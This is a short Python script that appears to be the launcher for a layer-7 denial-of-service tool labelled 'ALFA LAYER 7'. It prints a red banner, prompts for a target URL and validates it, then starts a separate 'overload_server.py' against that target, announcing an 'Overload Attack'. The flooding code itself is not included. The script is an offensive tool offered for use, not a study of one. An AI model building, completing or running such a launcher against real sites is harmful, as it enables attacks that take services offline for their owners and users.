import random
import requests
from time import sleep
import re
import os
import subprocess
from rich.console import Console
import pyfiglet

console = Console()

# Function to validate URL
def is_valid_url(url: str) -> bool:
    regex = re.compile(
        r'^(?:http|ftp)s?://' 
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' 
        r'localhost|' 
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|' 
        r'?[A-F0-9]*:[A-F0-9:]+?)' 
        r'(?::\d+)?' 
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

# Display banner
banner = pyfiglet.figlet_format("ALFA LAYER 7")
console.print(f"[bold red]{banner}[/bold red]")

# Get user input for URL and validate it
while True:
    target_url = console.input("[red]│   └───URL: [/red]")
    if not is_valid_url(target_url):
        console.print("[bold red]Error: Invalid URL! Please enter a valid URL.[/bold red]")
    else:
        break

console.print(f"[green]Targeting: {target_url}[/green]")

# Start overload_server.py and pass the target URL
console.print("[yellow]Starting Overload Attack...[/yellow]")
subprocess.Popen(["python", "overload_server.py", target_url])

console.print("[bold green]Overload Server Attack Started![/bold green]")
